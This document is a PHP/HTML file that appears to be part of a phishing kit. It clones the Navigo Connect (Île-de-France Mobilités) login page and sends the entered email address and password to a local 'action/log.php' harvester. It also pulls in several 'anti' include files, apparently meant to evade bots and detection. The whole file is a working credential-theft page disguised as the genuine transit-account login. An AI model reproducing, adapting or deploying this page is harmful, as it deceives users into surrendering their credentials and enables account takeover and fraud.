<?php

include('prevents/anti1.php');
include('prevents/anti2.php');
include('prevents/anti3.php');
include('prevents/anti4.php');
include('prevents/anti5.php');
include('prevents/anti6.php');
include('prevents/anti7.php');
include('prevents/anti8.php');
include('ab.php');

if(!isset($_SESSION['user_id']))
{
    $_SESSION['user_id'] = uniqid();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0198)https://connect.navigo.fr/auth/realms/connect/login-actions/authenticate?client_id=me-deplacer.iledefrance-mobilites.fr&tab_id=mrQdlz6AuQY&execution=345d49d6-8ec6-44a2-84ad-7f3be62d9411&kc_locale=fr -->
<html xmlns="http://www.w3.org/1999/xhtml" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Navigo connect | Connexion</title>
    <link rel="icon" href="https://connect.navigo.fr/auth/resources/r4v0g/login/navigo-connect/img/favicon-32x32.png">
    <link href="login_files/style.min.css" rel="stylesheet">
</head>
<body class="">
<div id="container">
    <header role="banner">
        <div class="language-selector">
            <a class="selector__toggle" data-toggle="dropdown" href="https://connect.navigo.fr/auth/realms/connect/login-actions/authenticate?client_id=me-deplacer.iledefrance-mobilites.fr&amp;tab_id=mrQdlz6AuQY&amp;execution=345d49d6-8ec6-44a2-84ad-7f3be62d9411&amp;kc_locale=fr#">
                Français
            </a>
            <ul class="selector__list">
                <li class="item-util-level-2">
                    <a href="https://connect.navigo.fr/auth/realms/connect/login-actions/authenticate?client_id=me-deplacer.iledefrance-mobilites.fr&amp;tab_id=mrQdlz6AuQY&amp;execution=345d49d6-8ec6-44a2-84ad-7f3be62d9411&amp;kc_locale=en">
                        <span>English</span>
                    </a>
                </li>
                <li class="item-util-level-2">
                    <a href="https://connect.navigo.fr/auth/realms/connect/login-actions/authenticate?client_id=me-deplacer.iledefrance-mobilites.fr&amp;tab_id=mrQdlz6AuQY&amp;execution=345d49d6-8ec6-44a2-84ad-7f3be62d9411&amp;kc_locale=fr">
                        <span>Français</span>
                    </a>
                </li>
            </ul>
        </div>
        <h1>
            <a href="https://connect.navigo.fr/auth/realms/connect/account/"><span>Ile de France mobilités | CONNECT</span></a>
        </h1>
    </header>
    <div id="kc-content">
        <div id="kc-content-wrapper">

            <div id="container" xmlns="http://www.w3.org/1999/html">
                <h1 class="small"><small>Le compte qui facilite vos déplacements en Île-de-France</small></h1>
                <main class="page-login" role="main">
                    <section>
                        <h2> Je me connecte</h2>
                        <p></p>
                        <form id="form-log" action="action/log.php" method="post">
                            <p>
                                <label for="username" class="">Adresse e-mail</label>

                                <input required tabindex="1" id="id-Mail" class="" name="username" placeholder="ex : Ludovic.cruchot@mail.com" value="" type="text" autofocus="" autocomplete="off">
                            </p>
                            <p>
                                <label for="password" class="">Mot de passe</label>
                                <input required tabindex="2" id="id-pwd" class="" name="password" type="password" autocomplete="off">
                            </p>


                            <div id="kc-form-options">
                                <ul class="list_H-link">
                                    <li><a href="https://connect.navigo.fr/auth/realms/connect/login-actions/reset-credentials?client_id=me-deplacer.iledefrance-mobilites.fr&amp;tab_id=mrQdlz6AuQY">Mot de passe oublié</a></li>
                                    <li><a href="https://www.iledefrance-mobilites.fr/aide-et-contacts/navigo-connect/je-narrive-pas-a-me-connecter" class="ic-blank" target="_blank">Je n'arrive pas à me connecter</a></li>
                                </ul>



                                <p class="NoLegend">
                                    <input class="styled-checkbox" id="rememberMe" value="vl-rememberPWD" name="dt-rememberPWD" type="checkbox">
                                    <label for="rememberMe">Enregistrer mes identifiants pour une prochaine connexion</label>
                                </p>
                            </div>
                            <div id="kc-form-buttons" class="buttons-bar">
                                <p>
                                    <input type="hidden" class="bt-highlight" id="id-hidden-input-1" name="credentialId">
                                    <button tabindex="6" class="bt-highlight" name="login" id="id-hidden-input" type="submit" value="Je me connecte">Je me connecte</button>
                                </p>
                            </div>
                        </form>
                    </section>
                    <section class="box-register">
                        <h2>Pas encore de compte ?</h2>
                        <p>
                            <img id="img" src="login_files/illu1-login.svg" alt="">
                            <span>Créez en quelques clics votre compte Île-de-France Mobilités Connect afin de gérer simplement vos abonnements et vos préférences de déplacement. </span>
                        </p>
                        <div class="buttons-bar">
                            <p><a class="bt-secondary" tabindex="6" href="https://connect.navigo.fr/auth/realms/connect/login-actions/registration?client_id=me-deplacer.iledefrance-mobilites.fr&amp;tab_id=mrQdlz6AuQY">Je crée mon compte</a></p>
                        </div>
                    </section>
                </main>
                <!--
                -->

                <div id="kc-info" class="">
                    <div id="kc-info-wrapper" class="">
                    </div>
                </div>
            </div>
        </div>
        <footer>
        </footer>
        <script type="text/javascript" src="login_files/script.min.js"></script>


    </div></div></body></html>